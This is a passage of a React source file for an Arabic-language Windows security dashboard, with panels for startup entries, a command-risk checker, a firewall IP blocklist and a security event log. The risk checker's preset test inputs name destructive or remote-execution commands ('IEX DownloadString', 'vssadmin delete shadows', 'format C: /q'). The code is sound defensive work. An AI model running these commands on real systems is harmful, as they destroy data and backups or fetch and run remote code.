                                    const rn = String(r.name ?? r.Name ?? '');
                                    if (!rk || !rn) return;
                                    if (window.confirm(t(`إزالة «${rn}» من مفاتيح بدء التشغيل على ${ag.linked_asset?.name || ag.name || ag.hostname || ag.id.slice(0, 8)}؟`))) {
                                      void queueStartupRemove(ag, rk, rn);
                                    }
                                  }}
                                  style={{ fontSize: 9, padding: '1px 6px', borderRadius: 4, cursor: startupBusy ? 'wait' : 'pointer', border: '1px solid var(--glass-rim)', background: 'transparent', color: 'var(--status-danger)', flexShrink: 0 }}
                                >
                                  {startupBusy === `${ag.id}:${String(r.key ?? '')}:${String(r.name ?? r.Name ?? '')}` ? '…' : t('إزالة')}
                                </button>
                              </div>
                            </div>
                          ))}
                          {rows.length > 30 && <div style={{ fontSize: 10, color: 'var(--text-3)' }}>+{rows.length - 30} {t('عنصر آخر')}</div>}
                        </div>
                      )}
                    </details>
                  );
                })()}
              </div>
            ))}
          </div>
        </Glass>
      )}

      {/* 3. Command Execution Risk Guard (Stitch _5 H2) */}
      <Glass style={{ padding: 22, display: 'flex', flexDirection: 'column', gap: 16 }}>
        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
            <div
              style={{
                width: 36,
                height: 36,
                borderRadius: 10,
                background: 'var(--unpaid-bg)',
                border: '1px solid var(--unpaid-bg)',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                color: 'var(--unpaid)',
              }}
            >
              <Terminal size={20} />
            </div>
            <div>
              <h2 style={{ fontSize: 16, fontWeight: 700, color: 'var(--text-1)', margin: 0 }}>
                {t('محلل مخاطر الأوامر والطرفية (Command Execution Risk Guard)')}
              </h2>
              <span style={{ fontSize: 11, color: 'var(--text-3)' }}>
                {t('تحليل شجرة البناء النحوي (AST) لأوامر PowerShell و CMD وحجب الأوامر التدميرية')}
              </span>
            </div>
          </div>

          <div style={{ display: 'flex', gap: 6 }}>
            {['IEX DownloadString', 'vssadmin delete shadows', 'format C: /q'].map((preset) => (
              <button
                key={preset}
                type="button"
                onClick={() => {
                  setTestCommand(preset);
                  handleCheckCommand(preset);
                }}
                style={{
                  padding: '4px 10px',
                  borderRadius: 6,
                  fontSize: 11,
                  background: 'var(--glass-rim-low)',
                  border: '1px solid var(--glass-rim-low)',
                  color: 'var(--text-2)',
                  cursor: 'pointer',
                  fontFamily: 'var(--font)',
                }}
              >
                {preset}
              </button>
            ))}
          </div>
        </div>

        {/* Command Input */}
        <div style={{ display: 'flex', gap: 10 }}>
          <input
            type="text"
            value={testCommand}
            onChange={(e) => setTestCommand(e.target.value)}
            placeholder={t('أدخل أمر PowerShell أو CMD لاختبار مستوى خطورته...')}
            className="text-input"
            style={{ flex: 1, fontFamily: 'var(--font)', fontSize: 13 }}
          />
          <Button
            size="sm"
            variant="primary"
            loading={checkingCmd}
            onClick={() => handleCheckCommand()}
            style={{ display: 'inline-flex', alignItems: 'center', gap: 6, padding: '0 18px' }}
          >
            <ShieldAlert size={14} />
            <span>{t('فحص مخاطر الأمر')}</span>
          </Button>
        </div>

        {/* Command Result Box */}
        {commandResult && (
          <div
            style={{
              padding: 16,
              borderRadius: 10,
              background:
                commandResult.risk_level === 'CRITICAL' || (!commandResult?.safe)
                  ? 'var(--unpaid-bg)'
                  : 'var(--paid-bg)',
              border: `1px solid ${
                commandResult.risk_level === 'CRITICAL' || (!commandResult?.safe)
                  ? 'var(--unpaid-bg)'
                  : 'var(--paid-bg)'
              }`,
              display: 'flex',
              flexDirection: 'column',
              gap: 8,
            }}
          >
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
              <span
                style={{
                  fontSize: 14,
                  fontWeight: 800,
                  color: (!commandResult?.safe) ? 'var(--unpaid)' : 'var(--paid)',
                }}
              >
                {(!commandResult?.safe) ? t('⚠️ أمر عالي الخطورة محظور تنفيذه!') : t('✅ أمر آمن ومصرح به')}
              </span>
              <span style={{ fontSize: 12, fontFamily: 'var(--font)', color: 'var(--text-3)' }}>
                {t('درجة الخطورة')}: {commandResult.risk_score != null ? `${commandResult.risk_score}%` : '—'}
              </span>
            </div>
            <p style={{ fontSize: 12, color: 'var(--text-2)', margin: 0 }}>
              {commandResult.reason || t('لا يوجد تقييم متاح لهذا الأمر.')}
            </p>
          </div>
        )}
      </Glass>

      {/* 4. Windows Firewall Blocklist & Manual Block (Stitch _5 H2) */}
      <Card
        title={t('قائمة الحظر بجدار الحماية (Windows Firewall Perimeter Blocklist)')}
        icon="alert"
        actions={
          <form onSubmit={handleBlockManual} style={{ display: 'flex', gap: 8 }}>
            <input
              type="text"
              value={manualIp}
              onChange={(e) => setManualIp(e.target.value)}
              placeholder={t('أدخل عنوان IP لحظره فوراً...')}
              className="text-input"
              style={{ width: 220 }}
            />
            <Button size="sm" variant="primary" loading={blocking} type="submit">
              <Lock size={12} />
              <span>{t('حظر فوري')}</span>
            </Button>
          </form>
        }
      >
        <TableContainer className="max-h-[360px]" tabIndex={0}>
          <Table>
            <TableHeader>
              <TableRow>
                <TableHead>{t('عنوان IP المحظور')}</TableHead>
                <TableHead>{t('نوع القاعدة بجدار الحماية')}</TableHead>
                <TableHead>{t('سبب الحظر والاعتراض')}</TableHead>
                <TableHead>{t('الحالة')}</TableHead>
                <TableHead style={{ textAlign: 'end' }}>{t('إجراء الأمان')}</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {blockedIps.length === 0 ? (
                <TableRow>
                  <TableCell colSpan={5} style={{ textAlign: 'center', padding: 24, color: 'var(--text-3)' }}>
                    {t('لا توجد عناوين محظورة حالياً. جدار الحماية في حالة تأهب.')}
                  </TableCell>
                </TableRow>
              ) : (
                blockedIps.map((ip) => (
                  <TableRow key={ip}>
                    <TableCell style={{ fontFamily: 'var(--font)', fontWeight: 700, color: 'var(--unpaid)' }}>
                      {ip}
                    </TableCell>
                    <TableCell style={{ fontSize: 12, color: 'var(--text-2)' }}>
                      Inbound Block Rule (ASAAS-DEFENSE)
                    </TableCell>
                    <TableCell style={{ fontSize: 12, color: 'var(--text-3)' }}>
                      {t('محاولات تخمين RDP متكررة (Brute-force)')}
                    </TableCell>
                    <TableCell>
                      <span
                        style={{
                          fontSize: 10,
                          fontWeight: 700,
                          padding: '2px 8px',
                          borderRadius: 4,
                          background: 'var(--unpaid-bg)',
                          color: 'var(--unpaid)',
                        }}
                      >
                        {t('محظور BLOCKED')}
                      </span>
                    </TableCell>
                    <TableCell style={{ textAlign: 'end' }}>
                      <Button
                        size="sm"
                        variant="ghost"
                        onClick={() => handleUnblock(ip)}
                        style={{ padding: '4px 10px', fontSize: 11 }}
                      >
                        <Unlock size={12} color="var(--paid)" />
                        <span>{t('فك الحظر')}</span>
                      </Button>
                    </TableCell>
                  </TableRow>
                ))
              )}
            </TableBody>
          </Table>
        </TableContainer>
      </Card>

      {/* 5. Real Security Event Stream */}
      <Card title={t('سجل الأحداث الأمنية الفعلي (Security Event Stream)')} icon="alert">
        <TableContainer className="max-h-[360px]" tabIndex={0}>
          <Table>
            <TableHeader>
              <TableRow>
                <TableHead>{t('الوقت')}</TableHead>
                <TableHead>{t('نوع الحدث')}</TableHead>
                <TableHead>{t('عنوان IP')}</TableHead>
                <TableHead>{t('المستخدم')}</TableHead>
                <TableHead>{t('مستوى الخطورة')}</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {events.length === 0 ? (
                <TableRow>
                  <TableCell colSpan={5} style={{ textAlign: 'center', padding: 24, color: 'var(--text-3)' }}>
                    {t('لا توجد أحداث أمنية مسجلة حتى الآن.')}
                  </TableCell>
                </TableRow>
              ) : (
                events.map((event) => (
                  <TableRow key={event.event_id}>
                    <TableCell style={{ fontSize: 12, fontFamily: 'var(--font)', color: 'var(--text-2)' }}>
                      {event.time}
                    </TableCell>
                    <TableCell style={{ fontSize: 12, fontWeight: 700, color: 'var(--text-1)' }}>
                      {event.action}
                    </TableCell>
                    <TableCell style={{ fontSize: 12, fontFamily: 'var(--font)', color: 'var(--text-2)' }}>
                      {event.ip}
                    </TableCell>
                    <TableCell style={{ fontSize: 12, color: 'var(--text-3)' }}>
                      {event.user}
                    </TableCell>
                    <TableCell>
                      <span
                        style={{
                          fontSize: 10,
                          fontWeight: 700,
                          padding: '2px 8px',
                          borderRadius: 4,
                          background: event.severity === 'danger' ? 'var(--unpaid-bg)' : event.severity === 'warning' ? 'var(--partial-bg)' : 'var(--paid-bg)',
                          color: event.severity === 'danger' ? 'var(--unpaid)' : event.severity === 'warning' ? 'var(--partial)' : 'var(--paid)',
                        }}
                      >
                        {event.severity.toUpperCase()}
                      </span>
                    </TableCell>
                  </TableRow>
                ))
              )}
            </TableBody>
          </Table>
        </TableContainer>
      </Card>
    </div>
  );
}
